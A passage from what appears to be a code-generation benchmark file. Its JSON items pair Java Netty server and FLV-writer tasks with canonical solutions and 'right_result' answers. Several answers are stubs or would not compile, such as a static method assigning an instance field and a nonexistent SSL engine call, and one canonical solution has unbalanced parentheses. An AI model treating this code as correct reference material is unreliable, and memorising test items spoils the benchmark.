    "Instruction": "Task Description: Implement a Netty-based HTTP server in Java that handles incoming HTTP requests with tracing capabilities for specific endpoints.\n\nClass Description: NettyHttpServer is a TCP server implementation using Netty framework that listens for HTTP requests. It provides tracing functionality for specific endpoints (\"/unsampled\" and \"/traced\") while serving regular requests for other paths. The server manages its lifecycle through start and stop methods.\n\nAttributes:\n- bossGroup: [EventLoopGroup] - Handles incoming connections (accept loop)\n- workerGroup: [EventLoopGroup] - Handles I/O operations for established connections\n\nMethods:\n- startServer() -> [int] - Starts the HTTP server on an available port, returns the bound port number\n- stopServer() -> [void] - Shuts down the server gracefully, releasing all resources\n- TracingDispatchHandler (inner class) - Handles request tracing for specific endpoints\n  - channelRead(ChannelHandlerContext, Object) -> [void] - Processes incoming messages and routes them to appropriate tracing handlers\n  - write(ChannelHandlerContext, Object, ChannelPromise) -> [void] - Processes outgoing messages with tracing context",
    "Canonical_solution": "import brave.Tracing;\nimport brave.baggage.BaggagePropagation;\nimport brave.baggage.BaggagePropagationConfig.SingleBaggageField;\nimport brave.propagation.B3Propagation;\nimport brave.sampler.Sampler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelDuplexHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.AttributeKey;\nimport java.net.InetSocketAddress;\n\npublic class NettyHttpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public int startServer() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.option(ChannelOption.SO_BACKLOG, 1024);\n        b.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(final Channel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(new TracingDispatchHandler());\n                    p.addLast(new HelloWorldHandler());\n                }\n            });\n\n        Channel ch = b.bind(0).sync().channel();\n        return ((InetSocketAddress) ch.localAddress()).getPort();\n    }\n\n    public void stopServer() {\n        if (bossGroup != null) bossGroup.shutdownGracefully();\n        if (workerGroup != null) workerGroup.shutdownGracefully();\n    }\n\n    static class TracingDispatchHandler extends ChannelDuplexHandler {\n        static final AttributeKey<String> URI_ATTRIBUTE = AttributeKey.valueOf(\"uri\");\n\n        final ChannelDuplexHandler unsampled = NettyHttpTracing.create(\n            Tracing.newBuilder().sampler(Sampler.NEVER_SAMPLE).build()\n        ).serverHandler();\n        final ChannelDuplexHandler traced = NettyHttpTracing.create(\n            Tracing.newBuilder()\n                .propagationFactory(BaggagePropagation.newFactoryBuilder(B3Propagation.FACTORY)\n                .build()\n        ).serverHandler();\n\n        @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (!(msg instanceof HttpRequest)) {\n                ctx.fireChannelRead(msg);\n                return;\n            }\n            String uri = ((HttpRequest) msg).uri();\n            if (\"/unsampled\".equals(uri)) {\n                ctx.channel().attr(URI_ATTRIBUTE).set(uri);\n                unsampled.channelRead(ctx, msg);\n            } else if (\"/traced\".equals(uri)) {\n                ctx.channel().attr(URI_ATTRIBUTE).set(uri);\n                traced.channelRead(ctx, msg);\n            } else {\n                ctx.fireChannelRead(msg);\n            }\n        }\n\n        @Override\n        public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise prm) throws Exception {\n            String uri = ctx.channel().attr(URI_ATTRIBUTE).get();\n            if (uri == null) {\n                ctx.write(msg, prm);\n                return;\n            }\n            if (\"/unsampled\".equals(uri)) {\n                unsampled.write(ctx, msg, prm);\n            } else if (\"/traced\".equals(uri)) {\n                traced.write(ctx, msg, prm);\n            } else {\n                ctx.write(msg, prm);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\n\npublic class NettyHttpServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private int port;\n\n    public NettyHttpServer(int port) {\n        this.port = port;\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n    }\n\n    public int startServer() throws Exception {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 p.addLast(new HttpRequestDecoder());\n                 p.addLast(new HttpResponseEncoder());\n                 p.addLast(new TracingDispatchHandler());\n             }\n         });\n\n        ChannelFuture f = b.bind(port).sync();\n        return f.channel().localAddress().getPort();\n    }\n\n    public void stopServer() throws InterruptedException {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    private class TracingDispatchHandler extends SimpleChannelInboundHandler<Object> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            // Process incoming message\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                String uri = request.uri();\n                if (\"/unsampled\".equals(uri)) {\n                    handleUnsampled(ctx, request);\n                } else if (\"/traced\".equals(uri)) {\n                    handleTraced(ctx, request);\n                } else {\n                    handleRegular(ctx, request);\n                }\n            }\n        }\n\n        private void handleUnsampled(ChannelHandlerContext ctx, FullHttpRequest request) {\n            // Handle untraced request\n        }\n\n        private void handleTraced(ChannelHandlerContext ctx, FullHttpRequest request) {\n            // Handle traced request\n        }\n\n        private void handleRegular(ChannelHandlerContext ctx, FullHttpRequest request) {\n            // Handle regular request\n        }\n\n        @Override\n        public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) throws Exception {\n            // Process outgoing message with tracing context\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 228,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and echo back received messages.\n\nClass Description: The EchoServer class is a Netty-based TCP server that listens on a specified port, accepts client connections, and echoes back any received messages. It uses Netty's event-driven architecture for efficient network communication.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections\n\nMethods:\n- EchoServer(int port) -> Constructor - Initializes the server with the specified port number\n- start() -> void - Starts the server, binds to the specified port, and begins accepting connections. Handles server shutdown gracefully when stopped. Throws Exception if any error occurs during startup or operation",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class EchoServer {\n    private final int port;\n\n    public EchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        final EchoServerHandler serverHandler = new EchoServerHandler();\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b = b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(port))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(serverHandler);\n                        }\n                    });\n            ChannelFuture f = b.bind().sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully().sync();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class EchoServer {\n    private final int port;\n\n    public EchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new EchoServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n\n        new EchoServer(port).start();\n    }\n}\n\nclass EchoServerHandler extends io.netty.channel.SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(io.netty.channel.ChannelHandlerContext ctx, String msg) throws Exception {\n        ctx.writeAndFlush(msg);\n    }\n}\n```"
  },
  {
    "Task_id": 229,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle proxy server functionality, including SSL/TLS support, message encoding/decoding, and idle connection management.\n\nClass Description: ProxyServerContainer is a Netty-based TCP server container that manages proxy server operations. It handles client connections, processes proxy messages, and manages server resources. The class includes SSL/TLS support, custom message handlers, and graceful shutdown capabilities.\n\nAttributes:\n- serverWorkerGroup: [NioEventLoopGroup] - Handles I/O operations and other tasks for accepted connections\n- serverBossGroup: [NioEventLoopGroup] - Accepts incoming connections and assigns them to worker group\n- logger: [Logger] - SLF4J logger instance for logging server events and errors\n\nMethods:\n- ProxyServerContainer() -> [void] - Constructor that initializes the event loop groups\n- start() -> [void] - Starts the proxy server by binding to configured host/port and setting up channel pipeline\n- stop() -> [void] - Shuts down the server gracefully by releasing all resources\n- createSslHandler(SSLContext sslContext, boolean needsClientAuth) -> [ChannelHandler] - Creates SSL handler for secure communication (input: SSLContext for security configuration, boolean for client auth requirement; output: configured SSL handler)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport org.fengfei.lanproxy.server.config.ProxyConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class ProxyServerContainer {\n\n    private static final Logger logger = LoggerFactory.getLogger(ProxyServerContainer.class);\n\n    private NioEventLoopGroup serverWorkerGroup;\n    private NioEventLoopGroup serverBossGroup;\n\n    public ProxyServerContainer() {\n        serverBossGroup = new NioEventLoopGroup();\n        serverWorkerGroup = new NioEventLoopGroup();\n    }\n\n    public void start() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(serverBossGroup, serverWorkerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new ProxyMessageDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, \n                                LENGTH_FIELD_LENGTH, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                        pipeline.addLast(new ProxyMessageEncoder());\n                        pipeline.addLast(new IdleCheckHandler(IdleCheckHandler.READ_IDLE_TIME, \n                                IdleCheckHandler.WRITE_IDLE_TIME, 0));\n                        pipeline.addLast(new ServerChannelHandler());\n                    }\n                });\n\n        try {\n            ChannelFuture future = bootstrap.bind(ProxyConfig.getInstance().getServerBind(), \n                    ProxyConfig.getInstance().getServerPort()).sync();\n            logger.info(\"proxy server start on port \" + ProxyConfig.getInstance().getServerPort());\n        } catch (InterruptedException ex) {\n            throw new RuntimeException(ex);\n        }\n    }\n\n    private ChannelHandler createSslHandler(SSLContext sslContext, boolean needsClientAuth) {\n        SSLEngine sslEngine = sslContext.createSSLEngine();\n        sslEngine.setUseClientMode(false);\n        if (needsClientAuth) {\n            sslEngine.setNeedClientAuth(true);\n        }\n        return new SslHandler(sslEngine);\n    }\n\n    public void stop() {\n        serverBossGroup.shutdownGracefully();\n        serverWorkerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.net.ssl.SSLContext;\nimport java.util.concurrent.TimeUnit;\n\npublic class ProxyServerContainer {\n    private final EventLoopGroup serverWorkerGroup = new NioEventLoopGroup();\n    private final EventLoopGroup serverBossGroup = new NioEventLoopGroup();\n    private static final Logger logger = LoggerFactory.getLogger(ProxyServerContainer.class);\n\n    public void start(int port, SSLContext sslContext, boolean needsClientAuth) throws Exception {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(serverBossGroup, serverWorkerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 if (sslContext != null) {\n                     p.addLast(\"ssl\", createSslHandler(sslContext, needsClientAuth));\n                 }\n                 p.addLast(\"frameDecoder\", new LengthFieldBasedFrameDecoder(Integer.MAX_VALUE, 0, 4, 0, 4));\n                 p.addLast(\"frameEncoder\", new LengthFieldPrepender(4));\n                 p.addLast(\"idleStateHandler\", new IdleStateHandler(0, 0, 60, TimeUnit.SECONDS));\n                 p.addLast(\"proxyHandler\", new ProxyMessageHandler());\n             }\n         })\n         .option(ChannelOption.SO_BACKLOG, 128)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture f = b.bind(port).sync();\n        f.channel().closeFuture().sync();\n    }\n\n    public void stop() {\n        serverWorkerGroup.shutdownGracefully();\n        serverBossGroup.shutdownGracefully();\n    }\n\n    public SslHandler createSslHandler(SSLContext sslContext, boolean needsClientAuth) {\n        return new SslHandler(sslContext.getServerSocketFactory().createSSLEngine(), needsClientAuth);\n    }\n}\n```"
  },
  {
    "Task_id": 23,
    "Instruction": "Task Description: Create a Java class for writing FLV (Flash Video) files using Java NIO's FileChannel and ByteBuffer for efficient file operations. The class should handle both new file creation and appending to existing files, including metadata management.\n\nClass Description: The FLVWriter class provides functionality to write FLV video files with proper headers, metadata tags, and media data tags. It uses Java NIO channels and buffers for efficient file operations, supporting both new file creation and appending to existing files while maintaining FLV format specifications.\n\nAttributes:\n- fileChannel: [SeekableByteChannel] - Channel for writing the final FLV output file\n- dataChannel: [SeekableByteChannel] - Temporary channel for storing tags before finalization\n- filePath: [String] - Path to the output FLV file\n- append: [boolean] - Flag indicating whether to append to an existing file\n- appendOffset: [long] - Position in existing file where new data should be appended\n- meta: [Map<String, ?>] - Metadata extracted from existing FLV file when appending\n\nMethods:\n- FLVWriter(String filePath) -> [void] - Constructor that initializes the writer with a file path for new file creation\n- FLVWriter(Path path, boolean append) -> [void] - Constructor that initializes the writer with append mode and handles existing file metadata\n- getMetaData(Path path, int maxTags) -> [Map<String, ?>] - Extracts metadata from an existing FLV file (private method)\n- createDataFile() -> [void] - Creates a temporary data file for storing tags (private method)\n- createOutputFile() -> [void] - Creates the final output FLV file (private method)\n- writeTag(ITag tag) -> [boolean] - Writes a media tag to the temporary data file\n- close() -> [void] - Finalizes the FLV file and cleans up resources\n- finalizeFlv() -> [long] - Combines temporary data with existing file (if appending) and writes final FLV file (private method)",
    "Canonical_solution": "import java.io.File;\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Map;\n\npublic class FLVWriter {\n\n    private static final Logger log = LoggerFactory.getLogger(FLVWriter.class);\n\n    private SeekableByteChannel fileChannel;\n    private SeekableByteChannel dataChannel;\n    private String filePath;\n    private boolean append;\n    private long appendOffset = 13L;\n    private Map<String, ?> meta;\n\n    public FLVWriter(String filePath) {\n        this.filePath = filePath;\n        try {\n            createDataFile();\n        } catch (Exception e) {\n            log.error(\"Failed to create FLV writer\", e);\n        }\n    }\n\n    public FLVWriter(Path path, boolean append) {\n        filePath = path.toFile().getAbsolutePath();\n        this.append = append;\n        try {\n            if (append) {\n                meta = getMetaData(path, 5);\n                Files.move(path, path.resolveSibling(path.toFile().getName().replace(\".flv\", \".old\")));\n            }\n            createDataFile();\n        } catch (Exception e) {\n            log.error(\"Failed to create FLV writer\", e);\n        }\n    }\n\n    private Map<String, ?> getMetaData(Path path, int maxTags) throws IOException {\n        Map<String, ?> meta = null;\n        try (SeekableByteChannel channel = Files.newByteChannel(path, StandardOpenOption.READ)) {\n            long size = channel.size();\n            if (size > 0L) {\n                channel.position(appendOffset);\n                ByteBuffer dst = ByteBuffer.allocate(11);\n                do {\n                    int read = channel.read(dst);\n                    if (read > 0) {\n                        dst.flip();\n                        byte tagType = (byte) (dst.get() & 31);\n                        int bodySize = IOUtils.readUnsignedMediumInt(dst);\n                        if (tagType == ITag.TYPE_METADATA) {\n                            ByteBuffer buf = ByteBuffer.allocate(bodySize);\n                            read = channel.read(buf);\n                            if (read > 0) {\n                                buf.flip();\n                                Input input = new Input(IoBuffer.wrap(buf));\n                                String metaType = Deserializer.deserialize(input, String.class);\n                                meta = Deserializer.deserialize(input, Map.class);\n                                if (meta.containsKey(\"duration\")) {\n                                    appendOffset = channel.position() + 4L;\n                                    break;\n                                }\n                            }\n                            buf.compact();\n                        }\n                        channel.position(channel.position() + 4L);\n                        dst.compact();\n                    }\n                } while (--maxTags > 0);\n            }\n        }\n        return meta;\n    }\n\n    private void createDataFile() throws IOException {\n        Path path = Paths.get(filePath + \".ser\");\n        if (Files.deleteIfExists(path)) {\n            log.debug(\"Previous flv data file existed and was removed\");\n        }\n        this.dataChannel = Files.newByteChannel(path, StandardOpenOption.CREATE_NEW, StandardOpenOption.WRITE, StandardOpenOption.READ);\n    }\n\n    private void createOutputFile() throws IOException {\n        this.fileChannel = Files.newByteChannel(Paths.get(filePath), StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);\n    }\n\n    public boolean writeTag(ITag tag) throws IOException {\n        try {\n            int bodySize = tag.getBodySize();\n            byte dataType = tag.getDataType();\n            IoBuffer tagBody = tag.getBody();\n            int totalTagSize = 11 + bodySize + 4;\n            ByteBuffer tagBuffer = ByteBuffer.allocate(totalTagSize);\n            int timestamp = tag.getTimestamp();\n            byte[] bodyBuf = new byte[bodySize];\n            tagBody.get(bodyBuf);\n            IOUtils.writeUnsignedByte(tagBuffer, dataType);\n            IOUtils.writeMediumInt(tagBuffer, bodySize);\n            IOUtils.writeExtendedMediumInt(tagBuffer, timestamp);\n            tagBuffer.put(new byte[] {0, 0, 0});\n            tagBuffer.put(bodyBuf);\n            tagBuffer.putInt(11 + bodySize);\n            tagBuffer.flip();\n            dataChannel.write(tagBuffer);\n            return true;\n        } catch (Exception e) {\n            log.error(\"Failed to write tag\", e);\n            return false;\n        }\n    }\n\n    public void close() {\n        try {\n            finalizeFlv();\n        } catch (Exception e) {\n            log.error(\"Failed to finalize FLV\", e);\n        } finally {\n            try {\n                if (dataChannel != null) dataChannel.close();\n                if (fileChannel != null) fileChannel.close();\n            } catch (IOException e) {\n                log.error(\"Failed to close channels\", e);\n            }\n        }\n    }\n\n    private long finalizeFlv() throws IOException {\n        createOutputFile();\n        writeHeader();\n        writeMetadataTag();\n        ByteBuffer dst = ByteBuffer.allocate(1024);\n        if (append) {\n            Path prevFlv = Paths.get(filePath.replace(\".flv\", \".old\"));\n            if (Files.exists(prevFlv)) {\n                try (SeekableByteChannel prevChannel = Files.newByteChannel(prevFlv, StandardOpenOption.READ)) {\n                    prevChannel.position(appendOffset);\n                    int read;\n                    do {\n                        read = prevChannel.read(dst);\n                        if (read > 0) {\n                            dst.flip();\n                            fileChannel.write(dst);\n                            dst.compact();\n                        }\n                    } while (read > 0);\n                }\n                Files.deleteIfExists(prevFlv);\n            }\n        }\n        dataChannel.position(0L);\n        int read;\n        do {\n            read = dataChannel.read(dst);\n            if (read > 0) {\n                dst.flip();\n                fileChannel.write(dst);\n                dst.compact();\n            }\n        } while (read > 0);\n        Files.deleteIfExists(Paths.get(filePath + \".ser\"));\n        return fileChannel.position();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.*;\nimport java.util.HashMap;\nimport java.util.Map;\n\ninterface ITag {\n    byte[] getData();\n}\n\nclass FLVWriter implements AutoCloseable {\n    private SeekableByteChannel fileChannel;\n    private SeekableByteChannel dataChannel;\n    private String filePath;\n    private boolean append;\n    private long appendOffset;\n    private Map<String, Object> meta = new HashMap<>();\n\n    public FLVWriter(String filePath) throws IOException {\n        this.filePath = filePath;\n        this.append = false;\n        createOutputFile();\n    }\n\n    public FLVWriter(Path path, boolean append) throws IOException {\n        this.filePath = path.toString();\n        this.append = append;\n        if (append) {\n            loadMetadata(path);\n        } else {\n            createOutputFile();\n        }\n    }\n\n    private void loadMetadata(Path path) throws IOException {\n        // Load metadata logic here\n    }\n\n    private void createDataFile() throws IOException {\n        dataChannel = Files.newByteChannel(Paths.get(\"temp_data.flv\"), StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n    }\n\n    private void createOutputFile() throws IOException {\n        if (append) {\n            fileChannel = Files.newByteChannel(Paths.get(filePath), StandardOpenOption.READ, StandardOpenOption.WRITE);\n            appendOffset = fileChannel.size();\n        } else {\n            fileChannel = Files.newByteChannel(Paths.get(filePath), StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        }\n    }\n\n    public boolean writeTag(ITag tag) throws IOException {\n        ByteBuffer buffer = ByteBuffer.wrap(tag.getData());\n        return dataChannel.write(buffer) > 0;\n    }\n\n    @Override\n    public void close() throws IOException {\n        finalizeFlv();\n        fileChannel.close();\n        dataChannel.close();\n        Paths.get(\"temp_data.flv\").toFile().delete();\n    }\n\n    private long finalizeFlv() throws IOException {\n        if (!append) {\n            return fileChannel.position();\n        }\n\n        dataChannel.position(0);\n        ByteBuffer buffer = ByteBuffer.allocate(4 + 4); // size of uint32\n        buffer.putInt((int) (fileChannel.size() - appendOffset));\n        buffer.putInt((int) (dataChannel.size()));\n        fileChannel.position(appendOffset);\n        fileChannel.write(buffer);\n\n        dataChannel.transferTo(0, dataChannel.size(), fileChannel);\n        dataChannel.close();\n\n        return fileChannel.position();\n    }\n}\n```"
  },
  {
    "Task_id": 230,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: DiscardServer is a Netty-based TCP server that listens on a specified port, accepts client connections, and processes incoming data (discarding it in this example). It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- main: [main(String[] args)] -> void - Entry point that configures and starts the Netty server\n  - args: [String[]] - Command line arguments (not directly used)\n  - Throws: Exception - For various Netty and SSL related exceptions\n- initChannel: [initChannel(SocketChannel ch)] -> void - Initializes the channel pipeline for each new connection (inner method of ChannelInitializer)\n  - ch: [SocketChannel] - The socket channel being initialized\n  - Configures SSL handler (if enabled) and adds the main server handler to the pipeline",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class DiscardServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8009\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new DiscardServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class DiscardServer {\n    private static final int PORT = 8080;\n    private static boolean SSL = false;\n    private SslContext sslCtx;\n\n    public static void main(String[] args) throws Exception {\n        // Configure SSL.\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new DiscardServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static class DiscardServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            // Discard received data\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 231,
